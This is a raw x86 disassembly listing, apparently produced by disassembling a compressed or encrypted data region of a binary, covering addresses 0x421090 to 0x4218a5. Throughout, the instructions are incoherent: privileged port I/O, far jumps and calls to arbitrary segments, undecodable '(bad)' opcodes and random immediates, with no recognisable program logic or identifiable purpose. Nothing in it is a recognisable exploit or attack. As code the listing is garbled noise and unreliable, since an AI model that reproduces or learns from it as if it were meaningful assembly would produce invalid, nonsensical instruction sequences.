  421090:	xor    al,0x4a
  421092:	mov    ah,dh
  421094:	sbb    eax,esi
  421096:	xlat   BYTE PTR ds:[ebx]
  421097:	pop    ebx
  421098:	test   BYTE PTR [edi],ah
  42109a:	std    
  42109b:	out    0xb7,eax
  42109d:	jns    0x421035
  42109f:	dec    eax
  4210a0:	push   edi
  4210a1:	push   ecx
  4210a2:	jnp    0x42108f
  4210a4:	cmp    eax,DWORD PTR [ecx-0x5b]
  4210a7:	inc    ebp
  4210a8:	cmp    BYTE PTR [ebx+0x4],dl
  4210ab:	cdq    
  4210ac:	pop    eax
  4210ad:	sub    DWORD PTR [ebp+0x39],esi
  4210b0:	mov    ds:0x85318bda,eax
  4210b5:	shl    ebx,1
  4210b7:	into   
  4210b8:	dec    ecx
  4210b9:	mov    ch,BYTE PTR [esi-0xbb4ef4f]
  4210bf:	mov    cl,0x8e
  4210c1:	mov    DWORD PTR [ecx],edi
  4210c3:	neg    esp
  4210c5:	outs   dx,BYTE PTR ds:[esi]
  4210c6:	in     eax,dx
  4210c7:	imul   esi,DWORD PTR [ecx+0x5c6710eb],0xffffffe2
  4210ce:	leave  
  4210cf:	sar    DWORD PTR [ebx],1
  4210d1:	push   edi
  4210d2:	in     eax,dx
  4210d3:	mov    BYTE PTR [ecx],ah
  4210d5:	push   es
  4210d6:	int    0xfc
  4210d8:	fs inc ecx
  4210da:	pushf  
  4210db:	or     esp,DWORD PTR [eax-0x7b]
  4210de:	and    eax,0xa41b9aa0
  4210e3:	imul   ecx,DWORD PTR [ecx-0x28],0xffffffa6
  4210e7:	outs   dx,DWORD PTR ds:[esi]
  4210e8:	or     dl,BYTE PTR [ebp-0x295ca228]
  4210ee:	mov    bh,0x7c
  4210f0:	ror    eax,1
  4210f2:	aaa    
  4210f3:	push   ds
  4210f4:	lods   al,BYTE PTR ds:[esi]
  4210f5:	and    al,0xaa
  4210f7:	xor    eax,0x29251cb0
  4210fc:	mov    esi,0xe3fa598e
  421101:	mov    dl,0x26
  421103:	push   ecx
  421104:	pusha  
  421105:	fs push ss
  421107:	call   0x8d0f:0x1162deeb
  42110e:	shr    edi,cl
  421110:	pop    ds
  421111:	(bad)  
  421112:	mov    ebp,0x6c73b2a5
  421117:	adc    BYTE PTR [ebp+0x65],bh
  42111a:	das    
  42111b:	sti    
  42111c:	cmp    DWORD PTR [esi],0x8d3febfc
  421122:	idiv   DWORD PTR [ecx-0x7d9358ab]
  421128:	mov    BYTE PTR [esi+0x756b405b],bh
  42112e:	xchg   DWORD PTR [ebp-0x7e5d2a67],esi
  421134:	pop    esi
  421135:	pop    esi
  421136:	daa    
  421137:	icebp  
  421138:	cli    
  421139:	out    0x88,eax
  42113b:	xor    al,0xb3
  42113d:	cld    
  42113e:	sbb    ch,BYTE PTR [ecx+0x352a0c5e]
  421144:	nop
  421145:	sahf   
  421146:	pop    ebx
  421147:	in     eax,dx
  421148:	in     eax,dx
  421149:	mov    bh,0x8c
  42114b:	sub    bh,BYTE PTR [esi]
  42114d:	repz push 0x6f1f8f0a
  421153:	or     dl,BYTE PTR [esi]
  421155:	daa    
  421156:	int    0xe5
  421158:	jb     0x42117e
  42115a:	jmp    0x9fb6:0x3ebb60b0
  421161:	int3   
  421162:	or     esi,edx
  421164:	leave  
  421165:	jnp    0x42114a
  421167:	rol    BYTE PTR ds:[edi+edi*4-0x4c697612],0xf8
  421170:	sub    eax,0x26a42716
  421175:	into   
  421176:	xor    ebp,0x50
  421179:	(bad)  
  42117a:	cmc    
  42117b:	xchg   ebx,eax
  42117c:	sti    
  42117d:	add    al,ch
  42117f:	test   al,0x57
  421181:	mov    al,ds:0x52cc91d6
  421186:	mov    al,ds:0x309b859d
  42118b:	fwait
  42118c:	dec    ebx
  42118d:	out    0xe5,eax
  42118f:	cdq    
  421190:	xchg   ebp,eax
  421191:	cmp    DWORD PTR [ecx],eax
  421193:	ins    BYTE PTR es:[edi],dx
  421194:	nop
  421195:	stc    
  421196:	dec    esi
  421197:	icebp  
  421198:	pusha  
  421199:	sbb    eax,0x6f5ce88a
  42119e:	mov    WORD PTR [edi+0x76a6cf17],es
  4211a4:	lds    edx,FWORD PTR [edi]
  4211a6:	sbb    DWORD PTR [edx+0x50],0xe03999ba
  4211ad:	push   eax
  4211ae:	jl     0x4211a0
  4211b0:	test   eax,0x5e1bd34
  4211b5:	sbb    eax,0xd2b1715e
  4211ba:	mov    dl,0x6c
  4211bc:	imul   esi,DWORD PTR [eax-0x59ea7712],0xaf2a2585
  4211c6:	mov    al,0xb0
  4211c8:	adc    eax,0xe4c74fcc
  4211cd:	adc    DWORD PTR [edx+0x31342549],0xffffff8b
  4211d4:	push   ss
  4211d5:	adc    eax,0xab1d8dad
  4211da:	xor    al,0x93
  4211dd:	pop    edi
  4211de:	pop    eax
  4211df:	mov    bl,0xe
  4211e1:	push   edi
  4211e2:	inc    ebx
  4211e3:	and    eax,0x4763efa5
  4211e8:	xchg   ebx,eax
  4211e9:	es inc edx
  4211eb:	enter  0xfdf1,0x27
  4211ef:	mov    dl,0x63
  4211f1:	inc    esp
  4211f2:	adc    BYTE PTR [ecx],ch
  4211f4:	gs cmc 
  4211f6:	pop    ecx
  4211f7:	xor    eax,0x87eab1b
  4211fc:	(bad)  
  4211fd:	and    BYTE PTR [esi+0x33],dh
  421200:	sbb    DWORD PTR ds:[ecx+ecx*2],0xffffffe2
  421205:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421206:	pusha  
  421207:	jge    0x42125d
  421209:	adc    dh,BYTE PTR [edi+esi*4]
  42120c:	inc    esp
  42120d:	mov    eax,ds:0x7929f92e
  421212:	aad    0xa1
  421214:	pop    es
  421215:	xor    BYTE PTR [esi+0x751effa4],0xd
  42121c:	xchg   DWORD PTR [ebx+0x32],ebx
  42121f:	inc    eax
  421220:	push   cs
  421221:	fld    TBYTE PTR [edx+0xc]
  421224:	mov    ch,0x21
  421226:	dec    edx
  421227:	xor    bl,BYTE PTR [ecx+0xe]
  42122a:	xchg   DWORD PTR [ecx-0x22],ecx
  42122d:	or     BYTE PTR [ecx],0x4a
  421230:	cdq    
  421231:	push   ss
  421232:	mov    eax,es:0x1a7149ef
  421238:	dec    ecx
  421239:	pop    edx
  42123a:	(bad)  
  42123b:	loopne 0x4211d3
  42123d:	loop   0x421206
  42123f:	mov    eax,?
  421241:	(bad)  
  421242:	(bad)  [edi+0x1d166810]
  421249:	test   esi,ecx
  42124b:	into   
  42124c:	xchg   edi,eax
  42124d:	lods   eax,DWORD PTR ds:[esi]
  42124e:	xchg   DWORD PTR [esi-0x25e74807],ebp
  421254:	cmp    al,0x14
  421256:	adc    bl,0x62
  421259:	data16 mov ah,0x47
  42125c:	mov    dh,0x88
  42125e:	cmp    DWORD PTR [ecx+0x52],ebx
  421261:	(bad)  
  421262:	nop
  421263:	pop    ebx
  421264:	or     BYTE PTR [ebp-0x22675afb],bh
  42126a:	adc    ah,0x76
  42126d:	outs   dx,DWORD PTR ds:[esi]
  42126e:	test   BYTE PTR [edx+0x7d570bb4],dl
  421274:	lock and al,0x11
  421277:	and    DWORD PTR [ecx],esi
  421279:	pop    ebx
  42127a:	add    ebx,ecx
  42127c:	ins    DWORD PTR es:[edi],dx
  42127d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42127e:	and    al,0xd4
  421280:	clc    
  421281:	mov    edi,0xcc581568
  421286:	retf   
  421287:	xlat   BYTE PTR ds:[ebx]
  421288:	mov    eax,ds:0xe021f051
  42128d:	mov    edx,0xef712b58
  421292:	int3   
  421293:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421294:	mov    eax,ds:0x2d0e2f1c
  421299:	cdq    
  42129a:	mov    ecx,0x57769c0e
  42129f:	pop    es
  4212a0:	xor    al,0x96
  4212a2:	ret    0xd582
  4212a5:	dec    esp
  4212a6:	add    eax,0xaaad7e3c
  4212ab:	hlt    
  4212ac:	ins    DWORD PTR es:[edi],dx
  4212ad:	jecxz  0x4212fe
  4212af:	call   0x8ff6:0x86d66d8e
  4212b6:	je     0x42131f
  4212b8:	aas    
  4212b9:	mov    bl,0x4
  4212bb:	outs   dx,DWORD PTR ds:[esi]
  4212bc:	clc    
  4212bd:	es retf 
  4212bf:	addr16 and eax,0xfce9f807
  4212c5:	lea    esp,[esi+0x21]
  4212c8:	mov    dh,0x16
  4212ca:	sar    DWORD PTR [edx],0xb4
  4212cd:	arpl   WORD PTR [ebx],bx
  4212cf:	out    dx,al
  4212d0:	cs stos DWORD PTR es:[edi],eax
  4212d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4212d3:	pusha  
  4212d4:	push   ebp
  4212d5:	mov    eax,0x806293aa
  4212da:	dec    ebp
  4212db:	cld    
  4212dc:	repz jmp 0x9e35:0x41520dcc
  4212e4:	jl     0x421268
  4212e6:	cmp    al,0x1a
  4212e8:	lock xor eax,0xd7b39736
  4212ee:	into   
  4212ef:	and    DWORD PTR [edi+0x65983e9c],edx
  4212f5:	imul   BYTE PTR [edx]
  4212f7:	xor    dh,BYTE PTR [esi+0x6aa63796]
  4212fd:	scas   eax,DWORD PTR es:[edi]
  4212fe:	jg     0x421300
  421300:	(bad)  [esi]
  421302:	int3   
  421303:	mov    ds:0x3e144a41,eax
  421308:	xchg   ecx,eax
  421309:	std    
  42130a:	add    BYTE PTR [edi],ch
  42130c:	pop    ebx
  42130d:	sub    ah,dh
  42130f:	in     al,dx
  421310:	mov    DWORD PTR [ecx-0x19],ebp
  421313:	adc    BYTE PTR [edi+0x1c079f16],dl
  421319:	rcl    DWORD PTR [esi],1
  42131b:	xor    BYTE PTR [ecx+ebx*8-0x20],cl
  42131f:	sbb    eax,esi
  421321:	ret    
  421322:	fidivr DWORD PTR [ebx]
  421324:	inc    ecx
  421325:	ds shl esp,1
  421328:	or     bl,dh
  42132a:	mov    al,ds:0x7f368d26
  42132f:	mov    al,0xa6
  421331:	call   0xd4f1:0xa063c7db
  421338:	(bad)  
  421339:	retf   0x6838
  42133c:	mov    eax,ds:0x4f1440ce
  421341:	mov    edx,0x4d9430d
  421346:	jge    0x42134c
  421348:	in     eax,0xfe
  42134a:	or     eax,DWORD PTR [ecx+ebp*4+0x6c82a1c6]
  421351:	and    ebp,DWORD PTR [edx]
  421353:	outs   dx,DWORD PTR ds:[esi]
  421354:	mov    ?,WORD PTR ds:0x86cf1597
  42135a:	push   ds
  42135b:	xor    edx,DWORD PTR [ebp-0x66ef443a]
  421361:	push   ebp
  421362:	and    ecx,DWORD PTR [ebp-0x3c22f298]
  421368:	mov    bl,0x7f
  42136a:	mov    eax,ds:0xfffebeb9
  42136f:	mov    edx,0xc0aaccc0
  421374:	jle    0x421389
  421376:	inc    ebp
  421377:	jne    0x421388
  421379:	sar    DWORD PTR [edi+ebp*4],0x85
  42137d:	add    al,0xf5
  42137f:	mov    ?,WORD PTR [ebp-0x6943693f]
  421385:	loopne 0x4213e2
  421387:	std    
  421388:	inc    ebx
  421389:	fwait
  42138a:	popa   
  42138b:	daa    
  42138c:	xchg   ebp,eax
  42138d:	sub    ecx,DWORD PTR [esi+0x26]
  421390:	xchg   DWORD PTR [esi],edx
  421392:	jp     0x421407
  421394:	mov    ebx,0x5c3f51d3
  421399:	nop
  42139a:	scas   eax,DWORD PTR es:[edi]
  42139b:	repnz lea edx,[edi]
  42139e:	adc    al,0xb8
  4213a0:	adc    eax,0x553542f9
  4213a5:	ins    BYTE PTR es:[edi],dx
  4213a6:	fs and al,0x1a
  4213a9:	mov    esp,0xa5027312
  4213ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4213af:	arpl   sp,cx
  4213b1:	pop    esp
  4213b2:	mov    eax,0x2db93b11
  4213b7:	inc    eax
  4213b8:	test   BYTE PTR [edx+0x195543b3],ch
  4213be:	out    dx,al
  4213bf:	int    0xd7
  4213c1:	sar    DWORD PTR [edx+0x73188875],1
  4213c7:	cdq    
  4213c8:	cli    
  4213c9:	and    eax,ebp
  4213cb:	sbb    esp,edx
  4213cd:	xchg   edi,eax
  4213ce:	lea    edx,[eax-0x44]
  4213d1:	dec    edi
  4213d2:	push   0xfa1d93be
  4213d7:	int3   
  4213d8:	sbb    DWORD PTR [edi-0x13],0x57111304
  4213df:	adc    DWORD PTR [ebp+0x5c],edi
  4213e2:	loopne 0x421445
  4213e4:	shl    bl,1
  4213e6:	ret    0xa1f9
  4213e9:	mov    al,ds:0xa4ecf8
  4213ee:	fisubr DWORD PTR [edx+ebx*8+0x6374633]
  4213f5:	lods   al,BYTE PTR ds:[esi]
  4213f6:	adc    BYTE PTR [edx],bl
  4213f8:	cmp    al,0xc
  4213fa:	out    0xcf,eax
  4213fc:	jmp    0xfe87:0x45b2d62a
  421403:	cmc    
  421404:	jmp    0x303b0685
  421409:	mov    cl,0x80
  42140b:	inc    ebx
  42140c:	sub    edi,DWORD PTR [esi+0x73]
  42140f:	clc    
  421410:	add    DWORD PTR [eax],eax
  421412:	cmp    al,0xbb
  421414:	mov    ds:0x6f5bd516,eax
  421419:	inc    esi
  42141a:	in     eax,dx
  42141b:	sti    
  42141c:	icebp  
  42141d:	fcmovb st,st(7)
  42141f:	ja     0x42142f
  421421:	dec    edi
  421422:	sbb    edx,DWORD PTR [esi]
  421424:	jo     0x421454
  421426:	mov    ebx,0x3a8d766f
  42142b:	mov    ds:0xa267c59e,al
  421430:	mov    eax,0xbf7304e4
  421435:	loopne 0x4213c1
  421437:	add    dl,dl
  421439:	outs   dx,BYTE PTR ds:[esi]
  42143a:	jmp    0x102e:0x58aaa294
  421441:	jmp    0x42143d
  421443:	ss inc edx
  421445:	shl    BYTE PTR [edi-0x5a0ad148],1
  42144b:	int    0xec
  42144d:	cmp    al,0x30
  42144f:	mov    ch,0x4e
  421451:	inc    ebp
  421452:	sbb    al,0x21
  421454:	mov    cl,0x96
  421456:	mov    ebp,edx
  421458:	jmp    0x421480
  42145a:	or     dh,ch
  42145c:	add    eax,DWORD PTR [ecx+0x36]
  42145f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421460:	(bad)  
  421461:	and    DWORD PTR [esi+edx*8+0x740328fb],edx
  421468:	add    BYTE PTR [eax],al
  42146a:	mov    ebp,0x3f2e7edc
  42146f:	xor    DWORD PTR [eax-0x19],0xe9e32d7
  421476:	add    BYTE PTR [ebx+0x4b],bh
  421479:	popf   
  42147a:	jne    0x4214c1
  42147c:	xor    BYTE PTR [eax],cl
  42147e:	sbb    BYTE PTR [ebx],ch
  421480:	mov    ch,0xcd
  421482:	or     BYTE PTR [edi],dl
  421484:	jmp    0x42149e
  421486:	mov    ebp,0xdcae4399
  42148b:	fisub  WORD PTR [edi-0x61045234]
  421491:	push   ecx
  421492:	sub    eax,DWORD PTR [edi+0x54]
  421495:	sbb    DWORD PTR [edi+0x11],0x71
  421499:	pop    esp
  42149a:	cmp    DWORD PTR [ebx-0x6b],edx
  42149d:	mov    bl,dh
  42149f:	lods   eax,DWORD PTR ds:[esi]
  4214a0:	or     eax,0xe5429205
  4214a5:	in     eax,dx
  4214a6:	arpl   dx,ax
  4214a8:	test   al,bh
  4214aa:	clc    
  4214ab:	sbb    cl,BYTE PTR [eax+0xc]
  4214ae:	inc    esp
  4214af:	rol    DWORD PTR [edi+0x676e498e],cl
  4214b5:	dec    dx
  4214b7:	adc    eax,DWORD PTR [ebp-0x5b]
  4214ba:	sub    BYTE PTR [ebp-0x4d],ch
  4214bd:	sbb    BYTE PTR [ebp+0x7e5e76a0],bl
  4214c3:	xlat   BYTE PTR ds:[ebx]
  4214c4:	dec    edi
  4214c5:	jne    0x42149a
  4214c7:	mov    ecx,0x22bee088
  4214cc:	push   ds
  4214cd:	mov    bh,0x75
  4214cf:	push   esi
  4214d0:	ret    0xc314
  4214d3:	and    BYTE PTR [ecx+0x484d2213],0xae
  4214da:	loope  0x421523
  4214dc:	or     ah,bh
  4214de:	scas   al,BYTE PTR es:[edi]
  4214df:	mov    dh,0xc9
  4214e1:	and    cl,dh
  4214e3:	fnstsw WORD PTR [ebp-0x46]
  4214e6:	and    al,0xfe
  4214e8:	mov    dl,0x13
  4214ea:	scas   al,BYTE PTR es:[edi]
  4214eb:	push   eax
  4214ec:	xchg   edi,eax
  4214ed:	jb     0x42150f
  4214ef:	inc    dl
  4214f1:	cdq    
  4214f2:	xor    al,0x32
  4214f4:	retf   0xa956
  4214f7:	sbb    BYTE PTR [esi+0x47],al
  4214fa:	xor    DWORD PTR [ebp-0x5520135a],esp
  421500:	push   ecx
  421501:	push   esi
  421502:	stos   DWORD PTR es:[edi],eax
  421503:	es test ebp,edx
  421506:	clc    
  421507:	mov    dl,0xce
  421509:	cdq    
  42150a:	push   edx
  42150b:	mov    ch,0xdb
  42150d:	xchg   ebx,eax
  42150e:	xchg   BYTE PTR [ecx-0x751b2eb9],ch
  421514:	ins    DWORD PTR es:[edi],dx
  421515:	xchg   BYTE PTR [edx+0x6d],cl
  421518:	into   
  421519:	not    ch
  42151b:	mov    edx,0xbe99e064
  421520:	xlat   BYTE PTR ds:[ebx]
  421521:	add    al,0x4b
  421523:	cmc    
  421524:	stc    
  421525:	push   edi
  421526:	mov    edx,0xe65d8d61
  42152b:	lock add eax,0xfb90ee1d
  421531:	(bad)  
  421532:	scas   eax,DWORD PTR es:[edi]
  421533:	mov    eax,0x9b931a5b
  421538:	sar    DWORD PTR [ebx+0x11cf2d61],0xf
  42153f:	(bad)  
  421540:	cmp    BYTE PTR [ecx],ch
  421542:	push   eax
  421543:	mul    DWORD PTR [edi]
  421545:	mov    ebx,0xc638082c
  42154a:	sbb    DWORD PTR [edi-0x425ace64],ecx
  421550:	cmp    DWORD PTR [ebp+0x5502687c],edx
  421556:	lahf   
  421557:	cli    
  421558:	lea    ecx,[edx+ecx*1]
  42155b:	or     esi,0xd
  42155e:	cmp    dh,BYTE PTR [ebx]
  421560:	or     al,0x7e
  421562:	dec    edx
  421563:	inc    eax
  421564:	jmp    0x5bd7:0xde94405b
  42156b:	lea    esp,[ebp+ecx*8+0x5c]
  42156f:	cmp    al,0x48
  421571:	sbb    cl,BYTE PTR [ebp-0x5ae0bd15]
  421577:	paddsb mm2,QWORD PTR [ebx-0x26e28102]
  42157e:	out    0xe1,al
  421580:	imul   ebp,DWORD PTR [ebp+0x61],0x7
  421584:	xchg   DWORD PTR [ebp-0x769f035c],edi
  42158a:	push   esp
  42158b:	repz sbb al,0x36
  42158e:	out    0x51,eax
  421590:	dec    ebx
  421591:	adc    BYTE PTR [edx+ecx*1-0x38b35320],al
  421598:	mov    WORD PTR [eax],ds
  42159a:	jecxz  0x421567
  42159c:	repz sbb al,0x5a
  42159f:	pop    edi
  4215a0:	jge    0x421571
  4215a2:	push   esi
  4215a3:	popa   
  4215a4:	sub    esi,ebp
  4215a6:	sar    edi,cl
  4215a8:	push   ebx
  4215a9:	mov    ah,dl
  4215ab:	faddp  st(5),st
  4215ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4215ae:	mov    ecx,0x34ae42aa
  4215b3:	xor    al,0x95
  4215b5:	push   ebx
  4215b6:	push   ecx
  4215b7:	dec    ecx
  4215b8:	(bad)  
  4215b9:	sub    bh,BYTE PTR [edx+0x747d9fde]
  4215bf:	push   edx
  4215c0:	add    eax,0x89f20ab5
  4215c5:	jp     0x4215da
  4215c7:	aam    0x80
  4215c9:	pop    edx
  4215ca:	ds fadd st(7),st
  4215cd:	(bad)  
  4215ce:	out    dx,eax
  4215cf:	mov    dh,0x7d
  4215d1:	fs cdq 
  4215d3:	sbb    esi,DWORD PTR [eax]
  4215d5:	xor    eax,0x92c13d06
  4215da:	(bad)  
  4215dc:	dec    ebx
  4215dd:	inc    edx
  4215de:	mov    ds:0xeca9586,eax
  4215e3:	arpl   WORD PTR [ecx],sp
  4215e5:	xchg   ebx,eax
  4215e6:	inc    edx
  4215e7:	pop    ecx
  4215e8:	mov    eax,ds:0xed6f5068
  4215ed:	aas    
  4215ee:	mov    ebx,ecx
  4215f0:	push   esi
  4215f1:	(bad)
  4215f5:	(bad)  
  4215f6:	lds    edi,FWORD PTR [esi-0x4a]
  4215f9:	outs   dx,DWORD PTR ds:[esi]
  4215fa:	adc    BYTE PTR [ebx-0x6d],ch
  4215fd:	jmp    0x421623
  4215ff:	mov    ?,WORD PTR [ebx+0x76c83051]
  421605:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421606:	in     eax,dx
  421607:	fiadd  DWORD PTR [ebp+0x3f]
  42160a:	in     eax,0x0
	...
  421628:	add    BYTE PTR [eax],al
  42162a:	push   edi
  42162b:	pop    edx
  42162c:	dec    edx
  42162d:	inc    esi
  42162e:	dec    edi
  42162f:	push   esi
  421630:	pop    edi
  421631:	pop    ebx
  421632:	push   esp
  421633:	inc    eax
  421634:	cmp    eax,0xf995eeb5
  421639:	xor    al,BYTE PTR [esi-0x76fffe5c]
  42163f:	push   es
  421640:	add    BYTE PTR [eax],al
  421642:	jmp    0x1beb:0x6a4109b6
  421649:	shr    BYTE PTR [edi-0x34],0x7d
  42164d:	xchg   edx,eax
  42164e:	inc    ecx
  42164f:	add    eax,0x77edffef
  421654:	xor    dh,BYTE PTR [edx-0x6]
  421657:	aam    0xf
  421659:	or     esi,DWORD PTR [ebp+0x39d9f59c]
  42165f:	popa   
  421660:	cs (bad) 
  421662:	lds    edi,FWORD PTR ds:[ebp+ecx*8-0x6d]
  421667:	xchg   edi,eax
  421668:	add    BYTE PTR [esi+esi*8+0x45efe499],al
  42166f:	add    eax,0xdb5f9922
  421674:	ins    BYTE PTR es:[edi],dx
  421675:	jp     0x4216e3
  421677:	mov    eax,0x11a31dd3
  42167c:	mov    DWORD PTR [ecx+ecx*4+0x2ca15c87],0x35c60d8f
  421687:	sbb    eax,0x39f86da6
  42168c:	mov    ebx,0x98e23e04
  421691:	stos   BYTE PTR es:[edi],al
  421692:	push   eax
  421693:	push   esp
  421694:	push   ecx
  421695:	sub    eax,DWORD PTR [ebp+0x30]
  421698:	pop    ss
  421699:	xor    edx,DWORD PTR [ecx-0x60a8b15]
  42169f:	jg     0x42163d
  4216a1:	jbe    0x421633
  4216a3:	push   ds
  4216a4:	mov    DWORD PTR [ebx+eiz*1+0x3b],ecx
  4216a8:	int3   
  4216a9:	push   esi
  4216aa:	mov    cs,WORD PTR [ebx]
  4216ac:	icebp  
  4216ad:	mov    ?,esp
  4216af:	inc    ebp
  4216b0:	xor    ebp,eax
  4216b2:	loope  0x421660
  4216b4:	or     DWORD PTR [edx],edi
  4216b6:	pop    ss
  4216b7:	adc    dl,ch
  4216b9:	icebp  
  4216ba:	pop    ecx
  4216bb:	mov    edx,0x6591f902
  4216c0:	cmc    
  4216c1:	shl    DWORD PTR [ebx],1
  4216c3:	dec    edi
  4216c4:	retf   
  4216c5:	call   0xa557:0x7aacd178
  4216cc:	xchg   ebp,eax
  4216cd:	or     BYTE PTR [edx],ah
  4216cf:	pop    ds
  4216d0:	imul   eax,DWORD PTR [edx+0x4cb4cb16],0xffffff93
  4216d7:	std    
  4216d8:	mov    ds:0x344cc755,eax
  4216dd:	push   ecx
  4216de:	das    
  4216df:	sub    dl,BYTE PTR ds:[ecx-0x1586250e]
  4216e6:	fadd   DWORD PTR ds:0x70fc0ccf
  4216ec:	xchg   ebp,eax
  4216ed:	test   al,0x7d
  4216ef:	adc    eax,0x67dbcc54
  4216f4:	pop    es
  4216f5:	xchg   esp,eax
  4216f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4216f7:	pop    ebx
  4216f8:	lock scas al,BYTE PTR es:[edi]
  4216fa:	stc    
  4216fb:	cwde   
  4216fc:	pushf  
  4216fd:	xchg   BYTE PTR [esi+0x2e],ah
  421700:	(bad)  
  421701:	aaa    
  421702:	mov    eax,cs:0xb92caf72
  421708:	add    BYTE PTR [eax+0x7cd40141],al
  42170e:	ins    DWORD PTR es:[edi],dx
  42170f:	ret    
  421710:	retf   0x1a35
  421713:	xlat   BYTE PTR ds:[ebx]
  421714:	call   0x9492edef
  421719:	xchg   BYTE PTR [edi+0x79421307],bl
  42171f:	nop
  421720:	mov    eax,ds:0x9bb0261b
  421725:	dec    esi
  421726:	xchg   esi,eax
  421727:	cmp    BYTE PTR [edx],0x56
  42172a:	fild   DWORD PTR [esi]
  42172c:	xchg   esi,eax
  42172d:	out    dx,eax
  42172e:	scas   al,BYTE PTR es:[edi]
  42172f:	xchg   ecx,eax
  421730:	or     DWORD PTR [eax],ecx
  421732:	xor    al,0x98
  421734:	cmp    DWORD PTR [eax],0xffffffe9
  421737:	and    ecx,DWORD PTR [ecx]
  421739:	xchg   DWORD PTR es:[edi-0x5ceccf1d],ecx
  421740:	dec    ebp
  421741:	stos   BYTE PTR es:[edi],al
  421742:	div    BYTE PTR [ecx]
  421744:	dec    edi
  421745:	into   
  421746:	dec    eax
  421747:	sub    eax,0x9845b361
  42174c:	and    BYTE PTR [ebp+0xb],0x5f
  421750:	aad    0xe1
  421752:	outs   dx,DWORD PTR ds:[esi]
  421753:	nop
  421754:	in     al,dx
  421755:	xor    eax,0x14876f79
  42175a:	xor    BYTE PTR [ecx+esi*1-0x718aae5c],ch
  421761:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421762:	in     al,dx
  421763:	sbb    DWORD PTR [eax+ebp*1-0x55],0xffffff9d
  421768:	xchg   esi,eax
  421769:	fst    DWORD PTR [edi+0x36ce1d08]
  42176f:	xchg   esi,eax
  421770:	clc    
  421771:	out    0x8a,al
  421773:	mov    dh,0x28
  421775:	push   ebp
  421776:	mov    ebx,0x7c675c98
  42177b:	call   0x2a95:0x45b0ad1c
  421782:	dec    eax
  421783:	mov    al,ds:0x7bcbc640
  421788:	push   ds
  421789:	call   0xf44ded1f
  42178e:	call   0x4a583ed
  421793:	add    eax,0x2b35ed44
  421798:	cdq    
  421799:	lods   eax,DWORD PTR ds:[esi]
  42179a:	lahf   
  42179b:	inc    esp
  42179c:	das    
  42179d:	das    
  42179e:	fs dec ebp
  4217a0:	xchg   BYTE PTR [esi],bh
  4217a2:	loop   0x4217bb
  4217a4:	int3   
  4217a5:	retf   
  4217a6:	shr    bh,1
  4217a8:	cvtps2pd xmm7,xmm7
  4217ab:	mov    ebp,0x5b8a12f3
  4217b0:	push   ecx
  4217b1:	(bad)  [edi-0x37]
  4217b4:	adc    DWORD PTR [ecx],ebp
  4217b6:	out    dx,eax
  4217b7:	pop    edi
  4217b8:	xor    al,0xb6
  4217ba:	lock daa 
  4217bc:	cmp    al,0x3d
  4217be:	fild   DWORD PTR [edx+0xd0ea733]
  4217c4:	imul   edx,DWORD PTR [ecx-0x5f],0x54
  4217c8:	std    
  4217c9:	loopne 0x4217ff
  4217cb:	mov    WORD PTR [esi+0x5],?
  4217ce:	mov    esp,0xa804a002
  4217d3:	push   esp
  4217d4:	mov    eax,ecx
  4217d6:	test   DWORD PTR [ebp-0x5f],esi
  4217d9:	mov    bl,0x53
  4217db:	in     al,dx
  4217dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4217dd:	sub    dl,BYTE PTR [edi]
  4217df:	mov    al,ds:0xc6a26b1f
  4217e4:	mov    ds:0x7663f2d2,eax
  4217e9:	cmp    BYTE PTR [eax],0x9e
  4217ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4217ed:	adc    ah,ah
  4217ef:	fnstenv [esi-0x56093585]
  4217f5:	call   0x39e2:0xc5193610
  4217fc:	adc    BYTE PTR [edi-0x6e68b6ed],0xfb
  421803:	cmp    bl,dh
  421805:	add    DWORD PTR [ecx+0x55f7a5fa],0xffffff99
  42180c:	lds    esi,FWORD PTR [ebx]
  42180e:	mov    al,ds:0x44c256e2
  421813:	fst    QWORD PTR [ebx-0x79db1867]
  421819:	ins    BYTE PTR es:[edi],dx
  42181a:	adc    cl,BYTE PTR [ecx-0x38fda4e0]
  421820:	loopne 0x4217eb
  421822:	cmp    esi,DWORD PTR [edi-0x63283cb8]
  421828:	mov    edi,0xa15db97a
  42182d:	jmp    0x66dff757
  421832:	mov    esp,0x53972129
  421837:	pushf  
  421838:	call   0x63502f25
  42183d:	push   ecx
  42183e:	jb     0x4217d5
  421840:	ret    
  421841:	stc    
  421842:	mov    ah,0xcb
  421844:	fdivr  st,st(6)
  421846:	dec    esp
  421847:	ins    DWORD PTR es:[edi],dx
  421848:	repnz aad 0x90
  42184b:	mov    ebp,0xf5152744
  421850:	arpl   WORD PTR ds:0x30bbcc3f,bx
  421856:	retf   
  421857:	std    
  421858:	mov    dh,0xe4
  42185a:	mov    esp,0xcfefd440
  42185f:	xchg   ebp,eax
  421860:	ss push es
  421862:	fimul  DWORD PTR [edi]
  421864:	sti    
  421865:	adc    eax,0xe68b81c5
  42186a:	rcl    DWORD PTR [esi+ebp*2+0x41404bf0],0x9e
  421872:	cs push edx
  421874:	jmp    0x42180e
  421876:	pushf  
  421877:	add    BYTE PTR [edi-0x64],ch
  42187a:	jnp    0x4218b7
  42187c:	or     al,0x9d
  42187e:	aad    0xce
  421880:	sbb    DWORD PTR [eax+0xaaeb8c8],ebx
  421886:	sub    DWORD PTR [esi+0x53],esp
  421889:	mov    WORD PTR [esi+0x74710379],gs
  42188f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421890:	(bad)  
  421891:	sbb    al,0xe6
  421893:	cmp    al,0x9a
  421895:	sub    DWORD PTR [eax+0x30],esp
  421898:	pop    esi
  421899:	mov    eax,ds:0x528853d
  42189e:	dec    esp
  42189f:	(bad)  
  4218a0:	jno    0x4218d3
  4218a2:	daa    
  4218a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4218a4:	leave  
  4218a5:	pop    esp
